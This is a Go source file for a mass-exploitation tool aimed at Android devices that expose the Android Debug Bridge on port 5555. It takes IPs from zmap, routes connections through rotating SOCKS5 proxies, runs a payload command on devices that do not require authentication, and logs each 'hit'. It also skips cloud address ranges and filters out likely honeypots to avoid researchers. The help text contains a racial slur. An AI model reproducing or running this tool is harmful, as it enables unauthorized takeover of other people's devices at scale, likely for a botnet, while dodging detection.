package main

import (
	"bufio"
	"context"
	"crypto/rand"
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"log"
	"math/big"
	"net"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/proxy"
)

const (
	connTimeout    = 20 * time.Second
	defaultMaxData = 4096
	adbVersion     = 0x01000000
)

var (
	debug           bool
	debugFull       bool
	showOutput      bool
	hitsPath        string
	tried           uint64
	connected       uint64
	executed        uint64
	failed          uint64
	authRequired    uint64
	sorrowSucceeded uint64
	payloadHits     uint64
	skippedCloud    uint64
	skippedTrap     uint64
	proxyIndex      uint32
	skipCloud       bool
	skipTrap        bool
	hitsMu          sync.Mutex
	hitsSeen        sync.Map
)

type AdbMessage struct {
	Command uint32
	Arg0    uint32
	Arg1    uint32
	Length  uint32
	CRC32   uint32
	Magic   uint32
	Payload []byte
}

const (
	A_CNXN = 0x4e584e43
	A_AUTH = 0x48545541
	A_OPEN = 0x4e45504f
	A_OKAY = 0x59414b4f
	A_CLSE = 0x45534c43
	A_WRTE = 0x45545257
)

func debugf(format string, v ...interface{}) {
	if debug {
		log.Printf(format, v...)
	}
}

func printUsage() {
	fmt.Println("Usage: zmap -p <port> <range> | ./adb <port> [options]")
	fmt.Println("Example: zmap -p 5555 1.2.3.0/24 | ./adb 5555 -j 500")
	fmt.Println("Options:")
	fmt.Println("  -j, --threads <int>   how many threads u wanna run nigga?")
	fmt.Println("  -d, --debug           debug logging (kinda useless if u ask me)")
	fmt.Println("  -f, --debug-full      ignore magic mismatch and dump raw response")
	fmt.Println("  -o, --output          show command output (idk why u would want ts)")
	fmt.Println("  --hits <file>         append payload OK targets (default: hits.txt)")
}

func main() {
	flagSet := flag.NewFlagSet("adb", flag.ExitOnError)
	threads := flagSet.Int("j", 100, "Number of concurrent workers")
	flagSet.IntVar(threads, "threads", 100, "Number of concurrent workers")
	flagSet.BoolVar(&debug, "d", false, "Enable debug logging")
	flagSet.BoolVar(&debug, "debug", false, "Enable debug logging")
	flagSet.BoolVar(&debugFull, "f", false, "Ignore magic mismatch and dump response")
	flagSet.BoolVar(&debugFull, "debug-full", false, "Ignore magic mismatch and dump response")
	flagSet.BoolVar(&showOutput, "o", false, "Show command output")
	flagSet.BoolVar(&showOutput, "output", false, "Show command output")
	flagSet.StringVar(&hitsPath, "hits", "hits.txt", "Log file for targets that accepted payload shell")
	skipCloud = true
	skipTrap = true
	flagSet.BoolVar(&skipCloud, "skip-cloud", true, "Skip datacenter/cloud IPs (common fake ADB)")
	flagSet.BoolVar(&skipTrap, "skip-trap", true, "Skip likely ADB honeypots (CNXN banner heuristics)")

	var positional []string
	var flagArgs []string
	for i := 1; i < len(os.Args); i++ {
		arg := os.Args[i]
		if strings.HasPrefix(arg, "-") {
			flagArgs = append(flagArgs, arg)
			if (arg == "-j" || arg == "--threads") && i+1 < len(os.Args) {
				flagArgs = append(flagArgs, os.Args[i+1])
				i++
			}
		} else {
			positional = append(positional, arg)
		}
	}

	flagSet.Parse(flagArgs)

	if debugFull {
		debug = true
	}

	if len(positional) < 1 {
		printUsage()
		os.Exit(1)
	}

	if stat, err := os.Stdin.Stat(); err == nil && (stat.Mode()&os.ModeCharDevice) != 0 {
		log.Fatalf("stdin must be a pipe from zmap (got terminal). Use: zmap -p PORT -o - | %s PORT -j N", os.Args[0])
	}

	port := positional[0]

	proxiesFile := "proxies.txt"
	payloadsFile := "payloads.txt"

	proxies, err := readLines(proxiesFile)
	if err != nil {
		log.Fatalf("Failed to read proxies from %s: %v", proxiesFile, err)
	}
	payloads, err := readLines(payloadsFile)
	if err != nil {
		log.Fatalf("Failed to read payloads from %s: %v", payloadsFile, err)
	}

	jobs := make(chan string, 10000)

	// Stats display
	go func() {
		for {
			time.Sleep(1 * time.Second)
			fmt.Printf("\r| Tried: %d | SkipDC: %d | SkipTrap: %d | Connected: %d | Auth: %d | Executed: %d | ShellOK: %d | Failed: %d | Killed: %d",
				atomic.LoadUint64(&tried),
				atomic.LoadUint64(&skippedCloud),
				atomic.LoadUint64(&skippedTrap),
				atomic.LoadUint64(&connected),
				atomic.LoadUint64(&authRequired),
				atomic.LoadUint64(&executed),
				atomic.LoadUint64(&payloadHits),
				atomic.LoadUint64(&failed),
				atomic.LoadUint64(&sorrowSucceeded))
		}
	}()

	log.Printf("[+] Starting with %d workers on port %s (hits -> %s)", *threads, port, hitsPath)

	ctx := context.Background()
	var wg sync.WaitGroup
	for i := 0; i < *threads; i++ {
		wg.Add(1)
		go worker(ctx, &wg, jobs, proxies, payloads, port)
	}

	// Feeder: stdin from zmap; closing jobs lets workers drain then exit cleanly.
	go func() {
		scanner := bufio.NewScanner(os.Stdin)
		for scanner.Scan() {
			ip := strings.TrimSpace(scanner.Text())
			if ip != "" {
				jobs <- ip
			}
		}
		if err := scanner.Err(); err != nil {
			log.Printf("[-] Stdin scanner error: %v", err)
		}
		close(jobs)
	}()

	wg.Wait()
	log.Printf("[+] Pipeline finished (stdin closed, workers done)")
}

func worker(ctx context.Context, wg *sync.WaitGroup, jobs <-chan string, proxies, payloads []string, port string) {
	defer wg.Done()

	for {
		select {
		case <-ctx.Done():
			return
		case target, ok := <-jobs:
			if !ok {
				return
			}
			atomic.AddUint64(&tried, 1)

			if skipCloud && isLikelyCloudADBTrap(target) {
				atomic.AddUint64(&skippedCloud, 1)
				continue
			}

			pIndex := atomic.AddUint32(&proxyIndex, 1) % uint32(len(proxies))
			proxyStr := proxies[pIndex]

			if strings.Contains(proxyStr, "-res-any") {
				if idx := strings.Index(proxyStr, ":"); idx != -1 {
					user := proxyStr[:idx]
					if !strings.Contains(user, "-session-") {
						sessionID := randomString(5)
						proxyStr = user + "-session-" + sessionID + proxyStr[idx:]
					}
				}
			}

			exploitTarget(ctx, target, proxyStr, port, payloads)
		}
	}
}

func exploitTarget(ctx context.Context, target, proxyAddr, port string, payloads []string) {
	dialer, err := newSocks5Dialer(ctx, proxyAddr, connTimeout)
	if err != nil {
		atomic.AddUint64(&failed, 1)
		return
	}

	var conn net.Conn
	if cDialer, ok := dialer.(proxy.ContextDialer); ok {
		conn, err = cDialer.DialContext(ctx, "tcp", net.JoinHostPort(target, port))
	} else {
		conn, err = dialer.Dial("tcp", net.JoinHostPort(target, port))
	}

	if err != nil {
		atomic.AddUint64(&failed, 1)
		return
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(5 * time.Second))

	// ADB Handshake
	cnxnPayload := []byte("host::\x00")
	if err := writeMessage(conn, A_CNXN, adbVersion, defaultMaxData, cnxnPayload); err != nil {
		atomic.AddUint64(&failed, 1)
		return
	}

	msg, err := readMessage(conn)
	if err != nil {
		atomic.AddUint64(&failed, 1)
		return
	}

	switch msg.Command {
	case A_AUTH:
		atomic.AddUint64(&authRequired, 1)
		return
	case A_CNXN:
		if skipTrap && cnxnLikelyHoneypot(msg.Arg1, msg.Payload) {
			atomic.AddUint64(&skippedTrap, 1)
			debugf("skip trap %s maxdata=%d banner=%q", target, msg.Arg1, truncateBanner(msg.Payload))
			return
		}
		atomic.AddUint64(&connected, 1)
		payload := payloads[0]
		if runPayloadCommand(conn, target, payload) {
			recordPayloadHit(target, port)
		}
	default:
		atomic.AddUint64(&failed, 1)
	}
}

func runPayloadCommand(conn net.Conn, target, command string) bool {
	if runADBService(conn, target, "shell:", command) {
		return true
	}
	return runADBService(conn, target, "exec:", command)
}

func runADBService(conn net.Conn, target, servicePrefix, command string) bool {
	const localID = uint32(1)
	conn.SetDeadline(time.Now().Add(30 * time.Second))
	started := time.Now()

	openPayload := []byte(fmt.Sprintf("%s%s\x00", servicePrefix, command))
	if err := writeMessage(conn, A_OPEN, localID, 0, openPayload); err != nil {
		return false
	}

	executedCmd := false
	shellOutput := false
	for {
		msg, err := readMessage(conn)
		if err != nil {
			return shellLooksReal(executedCmd, shellOutput, started)
		}

		switch msg.Command {
		case A_WRTE:
			if len(msg.Payload) > 0 {
				shellOutput = true
			}
			if showOutput {
				fmt.Printf("\n[output] [%s]: %s", target, string(msg.Payload))
			}
			if strings.Contains(string(msg.Payload), "Killed") || strings.Contains(string(msg.Payload), "byte") {
				atomic.AddUint64(&sorrowSucceeded, 1)
			}
			// Protocol requires OKAY after WRTE before more traffic.
			_ = writeMessage(conn, A_OKAY, localID, msg.Arg0, nil)
		case A_CLSE:
			if !executedCmd {
				atomic.AddUint64(&executed, 1)
				executedCmd = true
			}
			return shellLooksReal(executedCmd, shellOutput, started)
		case A_OKAY:
			continue
		}
	}
}

// cnxnLikelyHoneypot uses CNXN maxdata + features banner (ADBHoney / Shadowserver patterns).
func cnxnLikelyHoneypot(maxData uint32, banner []byte) bool {
	b := strings.ToLower(string(banner))
	feat := adbFeatureList(b)

	if maxData > 0 && maxData < 65536 {
		return true
	}
	// Common low-interaction honeypot: 256KiB max payload, tiny feature set.
	if maxData == 262144 && len(feat) <= 3 {
		return true
	}
	if len(feat) == 2 && feat["cmd"] && feat["shell_v2"] {
		if maxData <= 262144 {
			return true
		}
	}
	// Real phones/TV boxes usually advertise more than cmd+shell_v2 only.
	if len(feat) > 0 && len(feat) <= 2 && maxData <= 524288 {
		return true
	}
	return false
}

func adbFeatureList(bannerLower string) map[string]bool {
	out := make(map[string]bool)
	idx := strings.Index(bannerLower, "features=")
	if idx < 0 {
		return out
	}
	rest := bannerLower[idx+len("features="):]
	if cut := strings.IndexAny(rest, " \t\r\n\x00"); cut >= 0 {
		rest = rest[:cut]
	}
	for _, p := range strings.Split(rest, ",") {
		p = strings.TrimSpace(p)
		if p != "" {
			out[p] = true
		}
	}
	return out
}

func truncateBanner(b []byte) string {
	s := strings.TrimSpace(string(b))
	if len(s) > 80 {
		return s[:80] + "..."
	}
	return s
}

// shellLooksReal drops instant-close fake ADB (honeypots). Hits ≈ shell actually ran, not CNC bots.
func shellLooksReal(executed, hadOutput bool, started time.Time) bool {
	if !executed {
		return false
	}
	if hadOutput {
		return true
	}
	return time.Since(started) >= 2*time.Second
}

// isLikelyCloudADBTrap filters IPs that often expose 5555 but are not phones (AWS/GCP/Azure traps).
func isLikelyCloudADBTrap(ip string) bool {
	p := net.ParseIP(strings.TrimSpace(ip))
	if p == nil {
		return false
	}
	v4 := p.To4()
	if v4 == nil {
		return false
	}
	o1, o2 := v4[0], v4[1]
	switch o1 {
	case 3, 8, 13, 15, 16, 18, 23, 34, 35, 39, 43, 44, 45, 46, 47, 48, 49, 51, 52, 54, 56, 57, 59, 64, 66, 67, 68, 72, 99, 100, 103, 104, 106, 107, 119, 128, 129, 131, 134, 135, 136, 137, 138, 139, 140, 143, 144, 146, 147, 148, 149, 150, 151, 152, 153, 157, 158, 159, 160, 161, 162, 163, 164, 165, 168, 169, 170, 172, 173, 174, 175, 184, 204, 205, 206, 207, 208, 209, 216:
		return true
	}
	if o1 == 54 && o2 >= 160 {
		return true
	}
	if o1 == 35 && o2 >= 80 {
		return true
	}
	return false
}

func recordPayloadHit(target, port string) {
	if _, loaded := hitsSeen.LoadOrStore(target, struct{}{}); loaded {
		return
	}
	atomic.AddUint64(&payloadHits, 1)

	line := fmt.Sprintf("%s %s:%s\n", time.Now().UTC().Format(time.RFC3339), target, port)
	hitsMu.Lock()
	defer hitsMu.Unlock()
	f, err := os.OpenFile(hitsPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("[-] hits log: %v", err)
		return
	}
	defer f.Close()
	if _, err := f.WriteString(line); err != nil {
		log.Printf("[-] hits write: %v", err)
	}
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyz"
	ret := make([]byte, n)
	for i := range ret {
		num, _ := rand.Int(rand.Reader, big.NewInt(int64(len(letters))))
		ret[i] = letters[num.Int64()]
	}
	return string(ret)
}

func writeMessage(w io.Writer, command, arg0, arg1 uint32, payload []byte) error {
	var checksum uint32
	for _, b := range payload {
		checksum += uint32(b)
	}

	header := make([]byte, 24)
	binary.LittleEndian.PutUint32(header[0:4], command)
	binary.LittleEndian.PutUint32(header[4:8], arg0)
	binary.LittleEndian.PutUint32(header[8:12], arg1)
	binary.LittleEndian.PutUint32(header[12:16], uint32(len(payload)))
	binary.LittleEndian.PutUint32(header[16:20], checksum)
	binary.LittleEndian.PutUint32(header[20:24], command^0xFFFFFFFF)

	if _, err := w.Write(header); err != nil {
		return err
	}
	if len(payload) > 0 {
		if _, err := w.Write(payload); err != nil {
			return err
		}
	}
	return nil
}

func readMessage(r io.Reader) (*AdbMessage, error) {
	header := make([]byte, 24)
	if _, err := io.ReadFull(r, header); err != nil {
		return nil, err
	}

	msg := &AdbMessage{
		Command: binary.LittleEndian.Uint32(header[0:4]),
		Arg0:    binary.LittleEndian.Uint32(header[4:8]),
		Arg1:    binary.LittleEndian.Uint32(header[8:12]),
		Length:  binary.LittleEndian.Uint32(header[12:16]),
		CRC32:   binary.LittleEndian.Uint32(header[16:20]),
		Magic:   binary.LittleEndian.Uint32(header[20:24]),
	}

	if msg.Length > 0 {
		if msg.Length > 65536 {
			return nil, fmt.Errorf("length too large")
		}
		msg.Payload = make([]byte, msg.Length)
		if _, err := io.ReadFull(r, msg.Payload); err != nil {
			return nil, err
		}
	}
	return msg, nil
}

func newSocks5Dialer(ctx context.Context, proxyAddr string, timeout time.Duration) (proxy.Dialer, error) {
	proxyURL, err := url.Parse(fmt.Sprintf("socks5://%s", proxyAddr))
	if err != nil {
		return nil, err
	}
	return proxy.FromURL(proxyURL, &net.Dialer{Timeout: timeout})
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}
